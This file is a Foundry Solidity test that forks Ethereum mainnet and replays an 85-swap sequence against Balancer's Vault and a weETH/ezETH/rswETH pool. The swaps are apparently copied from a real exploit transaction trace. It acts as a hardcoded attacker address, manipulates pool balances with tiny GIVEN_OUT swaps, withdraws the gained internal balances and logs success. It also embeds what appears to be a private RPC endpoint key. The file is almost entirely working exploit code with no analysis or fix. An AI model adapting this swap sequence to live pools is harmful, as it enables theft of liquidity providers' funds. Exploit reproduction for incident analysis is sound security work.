// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IBalancerVault {
    enum SwapKind { GIVEN_IN, GIVEN_OUT }
    enum UserBalanceOpKind { DEPOSIT_INTERNAL, WITHDRAW_INTERNAL, TRANSFER_INTERNAL, TRANSFER_EXTERNAL }

    struct SingleSwap {
        bytes32 poolId;
        SwapKind kind;
        IAsset assetIn;
        IAsset assetOut;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    struct UserBalanceOp {
        UserBalanceOpKind kind;
        IAsset asset;
        uint256 amount;
        address sender;
        address payable recipient;
    }

    function swap(
        SingleSwap memory singleSwap,
        FundManagement memory funds,
        uint256 limit,
        uint256 deadline
    ) external payable returns (uint256);

    function getPoolTokens(bytes32 poolId)
        external view
        returns (
            IERC20[] memory tokens,
            uint256[] memory balances,
            uint256 lastChangeBlock
        );

    function manageUserBalance(UserBalanceOp[] memory ops) external payable;
    function getInternalBalance(address user, IERC20[] memory tokens)
        external view
        returns (uint256[] memory balances);
}

interface IAsset {}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function symbol() external view returns (string memory);
}

contract BalancerTriplePoolTest is Test {
    IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    bytes32 constant POOL_ID_TRIPLE = 0x848a5564158d84b8a8fb68ab5d004fae11619a5400000000000000000000066a;
    address constant TRIPLE_BPT = 0x848a5564158d84b8A8fb68ab5D004Fae11619A54;
    address constant ezETH = 0xbf5495Efe5DB9ce00f80364C8B423567e58d2110;
    address constant weETH = 0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee;
    address constant rswETH = 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0;
    address constant ATTACKER = address(0xAa760D53541d8390074c61DEFeaba314675b8e3f);

    struct ExactSwapData {
        address tokenIn;
        address tokenOut;
        uint256 amount;        // GIVEN_OUT amount
        uint256 expectedIn;    // Expected amount to pay
        uint8 indexIn;
        uint8 indexOut;
    }

    function testTriplePool() public {
        vm.createSelectFork(
            "https://greatest-prettiest-shard.quiknode.pro/b88e7d9ece3886528f7341abb3eabffa655fdc9c",
            23717101
        );

        console.log("Pool: weETH/ezETH/rswETH (0x848a5564158d84b8a8fb68ab5d004fae11619a5400000000000000000000066a)");
        (IERC20[] memory tokens, uint256[] memory initialBalances,) = VAULT.getPoolTokens(POOL_ID_TRIPLE);

        console.log("INITIAL STATE:");
        console.log("BPT:", initialBalances[0]);
        console.log("ezETH:", initialBalances[1] / 1e18, "ETH");
        console.log("weETH:", initialBalances[2] / 1e18, "ETH");
        console.log("rswETH:", initialBalances[3] / 1e18, "ETH");

        // Fund attacker with BPT
        deal(TRIPLE_BPT, ATTACKER, 10000 ether);

        vm.startPrank(ATTACKER);
        IERC20(TRIPLE_BPT).approve(address(VAULT), type(uint256).max);
        IERC20(ezETH).approve(address(VAULT), type(uint256).max);
        IERC20(weETH).approve(address(VAULT), type(uint256).max);
        IERC20(rswETH).approve(address(VAULT), type(uint256).max);

        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: ATTACKER,
            fromInternalBalance: false,
            recipient: payable(ATTACKER),
            toInternalBalance: true
        });

        // swaps from transaction trace
        ExactSwapData[85] memory swaps;

        swaps[0] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: ezETH,
            amount: 31487826131209268479,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[1] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: weETH,
            amount: 28452475255668423869,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[2] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: rswETH,
            amount: 89053036336646360813,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 3
        });

        swaps[3] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: ezETH,
            amount: 314878261312092685,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[4] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: weETH,
            amount: 284524752556684238,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[5] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: rswETH,
            amount: 890530363366463608,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 3
        });

        swaps[6] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: ezETH,
            amount: 3148782613120927,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[7] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: weETH,
            amount: 2845247525566843,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[8] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: rswETH,
            amount: 8905303633664636,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 3
        });

        swaps[9] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: ezETH,
            amount: 31487826131209,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[10] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: weETH,
            amount: 28452475255668,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[11] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: rswETH,
            amount: 89053036336646,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 3
        });

        swaps[12] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: ezETH,
            amount: 314878261312,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[13] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: weETH,
            amount: 284524752557,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[14] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: rswETH,
            amount: 890530363367,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 3
        });

        swaps[15] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: ezETH,
            amount: 3148782614,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[16] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: weETH,
            amount: 2845247526,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[17] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: rswETH,
            amount: 8905303634,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 3
        });

        swaps[18] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: ezETH,
            amount: 31487826,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[19] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: weETH,
            amount: 28452475,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[20] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: rswETH,
            amount: 89053036,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 3
        });

        swaps[21] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: ezETH,
            amount: 314878,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[22] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: weETH,
            amount: 284525,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[23] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: rswETH,
            amount: 890530,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 3
        });

        swaps[24] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: ezETH,
            amount: 3149,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[25] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: weETH,
            amount: 2845,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[26] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: rswETH,
            amount: 8906,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 3
        });

        swaps[27] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: ezETH,
            amount: 32,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[28] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: weETH,
            amount: 29,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[29] = ExactSwapData({
            tokenIn: TRIPLE_BPT,
            tokenOut: rswETH,
            amount: 90,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 3
        });

        swaps[30] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 4999999984,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[31] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[32] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: weETH,
            amount: 18000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[33] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 2692,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[34] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[35] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: weETH,
            amount: 13000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[36] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 306830,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[37] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[38] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: weETH,
            amount: 9300000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[39] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 21054,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[40] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[41] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: weETH,
            amount: 6600000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[42] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 14075,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[43] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[44] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: weETH,
            amount: 4700000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[45] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 8182,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[46] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[47] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: weETH,
            amount: 3300000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[48] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 1828,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[49] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[50] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: weETH,
            amount: 2300000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[51] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 584,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[52] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[53] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: weETH,
            amount: 1700000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[54] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 370877,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[55] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[56] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: weETH,
            amount: 1200000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[57] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 233,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[58] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[59] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: weETH,
            amount: 910000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[60] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 1001851,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[61] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[62] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: weETH,
            amount: 810000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[63] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 13960,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[64] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[65] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: weETH,
            amount: 531000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[66] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 78,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[67] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[68] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: weETH,
            amount: 420000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[69] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 7176,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[70] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[71] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: weETH,
            amount: 300000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[72] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 18633,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[73] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[74] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: weETH,
            amount: 210000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[75] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: TRIPLE_BPT,
            amount: 10000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });

        swaps[76] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: TRIPLE_BPT,
            amount: 10000000,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 0
        });

        swaps[77] = ExactSwapData({
            tokenIn: rswETH,
            tokenOut: TRIPLE_BPT,
            amount: 10000000000,
            expectedIn: 0,
            indexIn: 3,
            indexOut: 0
        });

        swaps[78] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: TRIPLE_BPT,
            amount: 10000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });

        swaps[79] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: TRIPLE_BPT,
            amount: 10000000000000000,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 0
        });

        swaps[80] = ExactSwapData({
            tokenIn: rswETH,
            tokenOut: TRIPLE_BPT,
            amount: 10000000000000000000,
            expectedIn: 0,
            indexIn: 3,
            indexOut: 0
        });

        swaps[81] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: TRIPLE_BPT,
            amount: 47499890220466816244,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });

        swaps[82] = ExactSwapData({
            tokenIn: weETH,
            tokenOut: TRIPLE_BPT,
            amount: 47499890220466816244,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 0
        });

        swaps[83] = ExactSwapData({
            tokenIn: rswETH,
            tokenOut: TRIPLE_BPT,
            amount: 47499890220466816244,
            expectedIn: 0,
            indexIn: 3,
            indexOut: 0
        });

        swaps[84] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: rswETH,
            amount: 41000000000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 3
        });


        console.log("Executing swaps...");
        uint256 successCount = 0;

        for (uint i = 0; i < swaps.length; i++) {
            IBalancerVault.SingleSwap memory swap = IBalancerVault.SingleSwap({
                poolId: POOL_ID_TRIPLE,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(swaps[i].tokenIn),
                assetOut: IAsset(swaps[i].tokenOut),
                amount: swaps[i].amount,
                userData: ""
            });

            try VAULT.swap(swap, funds, type(uint256).max, block.timestamp + 3600) {
                successCount++;
            } catch {
                // Continue on failure
            }
        }

        console.log("Swaps executed:", successCount, "/", swaps.length);

        // withdraw manageUserBalance
        IERC20[] memory internalTokens = new IERC20[](4);
        internalTokens[0] = IERC20(TRIPLE_BPT);
        internalTokens[1] = IERC20(ezETH);
        internalTokens[2] = IERC20(weETH);
        internalTokens[3] = IERC20(rswETH);

        uint256[] memory internalBalances = VAULT.getInternalBalance(ATTACKER, internalTokens);

        console.log("Internal balances:");
        console.log("  BPT:", internalBalances[0] / 1e18, "ETH");
        console.log("  ezETH:", internalBalances[1] / 1e18, "ETH");
        console.log("  weETH:", internalBalances[2] / 1e18, "ETH");
        console.log("  rswETH:", internalBalances[3] / 1e18, "ETH");

        if (internalBalances[0] > 0 || internalBalances[1] > 0 || internalBalances[2] > 0 || internalBalances[3] > 0) {
            uint256 opsCount = 0;
            if (internalBalances[0] > 0) opsCount++;
            if (internalBalances[1] > 0) opsCount++;
            if (internalBalances[2] > 0) opsCount++;
            if (internalBalances[3] > 0) opsCount++;

            IBalancerVault.UserBalanceOp[] memory ops = new IBalancerVault.UserBalanceOp[](opsCount);
            uint256 opIndex = 0;

            if (internalBalances[0] > 0) {
                ops[opIndex++] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(TRIPLE_BPT),
                    amount: internalBalances[0],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            if (internalBalances[1] > 0) {
                ops[opIndex++] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(ezETH),
                    amount: internalBalances[1],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            if (internalBalances[2] > 0) {
                ops[opIndex++] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(weETH),
                    amount: internalBalances[2],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            if (internalBalances[3] > 0) {
                ops[opIndex] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(rswETH),
                    amount: internalBalances[3],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            VAULT.manageUserBalance(ops);
            console.log("Withdrawal completed!");
        }

        vm.stopPrank();

        (,uint256[] memory finalBalances,) = VAULT.getPoolTokens(POOL_ID_TRIPLE);

        console.log("FINAL STATE:");
        console.log("BPT:", finalBalances[0]);
        console.log("ezETH:", finalBalances[1] / 1e18, "ETH");
        console.log("weETH:", finalBalances[2] / 1e18, "ETH");
        console.log("rswETH:", finalBalances[3] / 1e18, "ETH");

        console.log("ATTACKER BALANCES:");
        console.log("BPT:", IERC20(TRIPLE_BPT).balanceOf(ATTACKER) / 1e18);
        console.log("ezETH:", IERC20(ezETH).balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("weETH:", IERC20(weETH).balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("rswETH:", IERC20(rswETH).balanceOf(ATTACKER) / 1e18, "ETH");

        console.log("Total swaps:", successCount);
        console.log("SUCCESS!");
    }

}
